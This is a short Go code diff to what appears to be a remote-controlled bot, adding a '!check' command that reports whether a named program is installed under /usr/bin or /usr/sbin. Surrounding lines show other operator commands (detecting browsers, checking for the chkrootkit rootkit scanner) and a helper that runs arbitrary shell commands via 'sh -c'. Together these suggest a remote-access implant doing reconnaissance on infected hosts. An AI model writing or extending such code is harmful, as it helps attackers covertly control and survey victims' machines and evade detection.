@@ -209,6 +209,12 @@ func main() {
                         t.FriendSendMessage(friendNumber, runningDir)
                     } else if string(message) == "!detect_browsers" {
                         t.FriendSendMessage(friendNumber, detectBrowsers())
+                    } else if len([]rune(message)) >= 6 && string(message[0:6]) == "!check" {
+                        s := strings.Split(message, " ")
+                        total_args := len(s)
+                        program_name := s[1:total_args]
+                        check := checkProgramInstall(strings.Join(program_name, ""))
+                        t.FriendSendMessage(friendNumber, fmt.Sprintf("%s %v", program_name, check))
                     }
                 fmt.Println(len([]rune(message)))
             }
@@ -559,6 +565,16 @@ func checkChkrootkitInstall() (bool) {
     return installed
 }
 
+func checkProgramInstall(name string) (bool) {
+    path := fmt.Sprintf("/usr/bin/%s", name)
+    program_exists, _ := exists(path)
+    if program_exists == false {
+        path := fmt.Sprintf("/usr/sbin/%s", name)
+        program_exists, _ := exists(path)
+        return program_exists
+    }
+    return program_exists
+}
 // We use sh -c in the system cal to work around gos need to know the number of flags when running a program
 func systemCall(command string) ([]byte) {
     cmd := exec.Command("sh", "-c", command)
